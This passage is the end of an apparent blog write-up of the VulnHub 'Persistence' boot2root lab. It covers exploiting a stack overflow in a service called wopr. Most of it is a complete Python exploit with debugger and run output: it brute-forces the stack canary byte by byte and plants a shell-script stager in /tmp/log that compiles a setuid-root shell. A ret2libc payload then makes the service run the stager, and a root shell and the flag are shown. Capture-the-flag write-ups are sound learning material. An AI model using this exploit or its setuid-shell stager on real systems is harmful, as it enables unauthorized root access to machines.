root@kali:~# gdb -q ./wopr
Reading symbols from wopr&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ b *main
Breakpoint 1 at 0x80487de</p>

<p>gdb-peda$ r
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0xbffff4a4 &mdash;> 0xbffff60a (&ldquo;wopr&rdquo;)
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0x66a6f92e
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xbffff478 &mdash;> 0x0
ESP: 0xbffff3fc &mdash;> 0xb7e8ae36 (&lt;<strong>libc_start_main+230>:    mov    DWORD PTR [esp],eax)
EIP: 0x80487de (<main>: push   ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
   0x80487d7 &lt;get_reply+99>:    call   0x804865c &lt;</strong>stack_chk_fail@plt>
   0x80487dc &lt;get_reply+104>:   leave<br/>
   0x80487dd &lt;get_reply+105>:   ret  <br/>
=> 0x80487de <main>:    push   ebp
   0x80487df &lt;main+1>:  mov    ebp,esp
   0x80487e1 &lt;main+3>:  sub    esp,0x258
   0x80487e7 &lt;main+9>:  mov    eax,DWORD PTR [ebp+0x8]
   0x80487ea &lt;main+12>: mov    DWORD PTR [ebp-0x23c],eax
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff3fc &mdash;> 0xb7e8ae36 (&lt;__libc_start_main+230>:   mov    DWORD PTR [esp],eax)
0004| 0xbffff400 &mdash;> 0x1
0008| 0xbffff404 &mdash;> 0xbffff4a4 &mdash;> 0xbffff60a (&ldquo;wopr&rdquo;)
0012| 0xbffff408 &mdash;> 0xbffff4ac &mdash;> 0xbffff629 (&ldquo;SSH_AGENT_PID=3171&rdquo;)
0016| 0xbffff40c &mdash;> 0xb7fe08d8 &mdash;> 0xb7e74000 &mdash;> 0x464c457f
0020| 0xbffff410 &mdash;> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0024| 0xbffff414 &mdash;> 0xffffffff
0028| 0xbffff418 &mdash;> 0xb7ffeff4 &mdash;> 0x1cf2c
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Breakpoint 1, 0x080487de in main ()</p>

<p>gdb-peda$ searchmem /tmp/log
Searching for &lsquo;/tmp/log&rsquo; in: None ranges
Found 2 results, display max 2 items:
wopr : 0x8048c60 (&ldquo;/tmp/log&rdquo;)
wopr : 0x8049c60 (&ldquo;/tmp/log&rdquo;)
```</p>

<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>

<h2>wopr &ndash; the exploit</h2>

<p>To sum up what we have to do to exploit this, we can say that we have to:</p>

<ul>
<li>Provide a string of size 30</li>
<li>Provide the canary we have brute forced</li>
<li>Pad with 4 bytes</li>
<li>Write EIP to the location of <code>system()</code></li>
<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
<li>Provide the location of <code>/tmp/log</code></li>
</ul>


<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>

<p><code>text
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" +
"\x10\xc2\x16\x00" + "JUNK" + "\x60\x8c\x04\x08"
</code></p>

<p>I finished up coding the exploit, which eventually resulted in the following:</p>

<p>```python Persistence Sploit
import socket
import sys
import os</p>

<p>payload = &ldquo;A&rdquo; * 30  # amount of bytes to before the canary is hit
canary = &ldquo;&rdquo;     # canary that should update as its bruted</p>

<p>print &ldquo;&rdquo;"</p>

<pre><code>        A: "So, I heard you like pain...?"
        B: "... a bit"
        C: "Well, here it is, the: "
</code></pre>

<hr />

<p>|    \ /  <em>]|    \  / </em><strong>/|    / </strong><em>/|      |  /  </em>]|    \   /  ]  /  <em>]
|  o  )  [</em> |  D  )(   _  |  (   _ |      | /  [<em> |  _  | /  /  /  [</em>
|   <em>/    </em>]|    /  _<em>  | |  |_</em>  ||<em>|  |</em>||    <em>]|  |  |/  /  |    </em>]
|  | |   [<em> |    \  /  \ | |  |/  \ |  |  |  |   [</em> |  |  /   _ |   [<em>
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|<strong>| |</strong></em><strong>||</strong>|_|  _<strong>||</strong><strong>|_</strong>|  |<strong>|  |</strong><em><strong>||</strong>|<strong>|_</strong></em>||_____|</p>

<pre><code>  _____ ____  _       ___  ____  ______ 
 / ___/|    \| |     /   \|    ||      |
(   \_ |  o  ) |    |     ||  | |      |
 \__  ||   _/| |___ |  O  ||  | |_|  |_|
 /  \ ||  |  |     ||     ||  |   |  |  
 \    ||  |  |     ||     ||  |   |  |  
  \___||__|  |_____| \___/|____|  |__|  

            A: "AKA: FU superkojiman &amp;&amp; sagi- !!"
            A: "I also have no idea what I am doing"
</code></pre>

<p>&ldquo;&rdquo;"</p>

<p>print &ldquo;[+] Connecting &amp; starting canary brute force&hellip;&rdquo;</p>

<h1>start the canary brute loop. We want to brute 4 bytes &hellip;</h1>

<p>for x in xrange(1,5):</p>

<pre><code># ... and try all possibilities
for canary_byte in xrange(0, 256):

    # prepare the byte
    hex_byte = chr(canary_byte)

    # prepare the payload
    send = payload + canary + hex_byte

    # connect and send payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 3333))

    # get the inital banners
    sock.recv(35)   # [+] hello, my name is sploitable\n
    sock.recv(40)   # [+] would you like to play a game?\n 
    sock.recv(5)    # &gt; 

    # send the payload  
    sock.send(send)
    sock.recv(27)   # [+] yeah, I don't think so\n

    # if we have a OK response, then we will have this last part
    # as '[+] bye!\n' populated, if its wrong, not
    data =  sock.recv(64)   # [+] bye!\n
    if "bye" in data:
        print "[+] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
        canary += hex_byte
        sock.close()
        break

    sock.close()
# if we cant even find the first byte, we failed already
if len(canary) &lt;= 0:
    print "[-] Unable to even find the first bit of the canary. No luck"
    sys.exit(0)
</code></pre>

<h1>The canary is our ticket out of here!</h1>

<p>if len(canary) == 4:</p>

<pre><code>print "[+] Canary known as : {0}".format(canary.encode("hex"))
print "[+] Writing /tmp/log to be called by wopr later"

# ./wopr has the string /tmp/log in it. We will use this as
# our code exec point, overwriting whatever is in it atm
stager = """
    #!/bin/sh

    # First, prepare a small C shell and move it to /tmp with name getroot
    echo "int main(void)\n{\nsetuid(0);\nsystem(\\"/bin/sh\\");\nreturn 0;\n}" &gt; /tmp/getroot.c

    # compile it
    /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot

    # change ownership and setuid
    /bin/chown root:root /tmp/getroot
    /bin/chmod 4777 /tmp/getroot
"""

# write the file
with open('/tmp/log','w') as stager_file:
    stager_file.write(stager)

# make it executable
os.chmod('/tmp/log', 0755)

# now, with the stack canary known and the stager ready, lets corrupt
# EIP and sploit!
payload += canary               # canary we bruted
payload += "A" * 4              # padding to EIP wich is at byte 42
payload += "\x10\x62\xe5\xb7"   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
payload += "JUNK"               # JUNK. Should probably do exit() here. Meh.
payload += "\x60\x8c\x04\x08"   # location if /tmp/log string in .data

# and connect &amp;&amp; send
print "[+] Connecting to service"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 3333))
sock.recv(35)
sock.recv(40)
sock.recv(5)
print "[+] Sending Payload"
sock.send(payload)

sock.recv(64)
sock.close()
print "[+] Done"

print "[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)"
os.system("/tmp/getroot")
</code></pre>

<p>else:</p>

<pre><code>print "[!] Incomplete Canary. Can't continue reliably"
</code></pre>

<h1>done</h1>

<p>```</p>

<p>A sample run would be:</p>

<p>```bash Running sploit.py
bash-4.1$ ls -lah /tmp/sploit.py
-rw-rw-r&mdash;. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
bash-4.1$ python /tmp/sploit.py</p>

<pre><code>        A: "So, I heard you like pain...?"
        B: "... a bit"
        C: "Well, here it is, the: "
</code></pre>

<hr />

<p>|    \ /  <em>]|    \  / </em><strong>/|    / </strong><em>/|      |  /  </em>]|    \   /  ]  /  <em>]
|  o  )  [</em> |  D  )(   _  |  (   _ |      | /  [<em> |  _  | /  /  /  [</em>
|   <em>/    </em>]|    /  _<em>  | |  |_</em>  ||<em>|  |</em>||    <em>]|  |  |/  /  |    </em>]
|  | |   [<em> |    \  /  \ | |  |/  \ |  |  |  |   [</em> |  |  /   _ |   [<em>
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|<strong>| |</strong></em><strong>||</strong>|_|  _<strong>||</strong><strong>|_</strong>|  |<strong>|  |</strong><em><strong>||</strong>|<strong>|_</strong></em>||_____|</p>

<pre><code>  _____ ____  _       ___  ____  ______ 
 / ___/|    \| |     /   \|    ||      |
(   \_ |  o  ) |    |     ||  | |      |
 \__  ||   _/| |___ |  O  ||  | |_|  |_|
 /  \ ||  |  |     ||     ||  |   |  |  
 \    ||  |  |     ||     ||  |   |  |  
  \___||__|  |_____| \___/|____|  |__|  

            A: "AKA: FU superkojiman &amp;&amp; sagi- !!"
            A: "I also have no idea what I am doing"
</code></pre>

<p>[+] Connecting &amp; starting canary bruteforce&hellip;
[+] Found a possible canary value of &lsquo;64&rsquo;!
[+] Found a possible canary value of &lsquo;d3&rsquo;!
[+] Found a possible canary value of &lsquo;c6&rsquo;!
[+] Found a possible canary value of &lsquo;15&rsquo;!
[+] Canary known as : 64d3c615
[+] Writing /tmp/log to be called by wopr later
[+] Connecting to service
[+] Sending Payload
[+] Done
[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
sh-4.1# id
uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```</p>

<p>And, as proof, we cat the flag!</p>

<p>```bash Persistence w00t
sh-4.1# cat /root/flag.txt</p>

<pre><code>          .d8888b.  .d8888b. 888    
         d88P  Y88bd88P  Y88b888    
         888    888888    888888    
</code></pre>

<p>888  888  888888    888888    888888888
888  888  888888    888888    888888  <br/>
888  888  888888    888888    888888  <br/>
Y88b 888 d88PY88b  d88PY88b  d88PY88b.<br/>
 &ldquo;Y8888888P&rdquo;  &ldquo;Y8888P&rdquo;  &ldquo;Y8888P&rdquo;  &ldquo;Y888</p>

<p>Congratulations!!! You have the flag!</p>

<p>We had a great time coming up with the
challenges for this boot2root, and we
hope that you enjoyed overcoming them.</p>

<p>Special thanks goes out to @VulnHub for
hosting Persistence for us, and to
@recrudesce for testing and providing
valuable feedback!</p>

<p>Until next time,</p>

<pre><code>  sagi- &amp; superkojiman
</code></pre>

<p>```</p>

<h2>conclusion</h2>

<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>

<h2>thats not all</h2>

<p>There are however a few more things I&rsquo;d like to try.</p>

<ul>
<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
<li>Modify the exploit to a working ROP payload</li>
<li>Explore other avenues to break out of rbash</li>
</ul>

]]></content>
  </entry>
  
</feed>
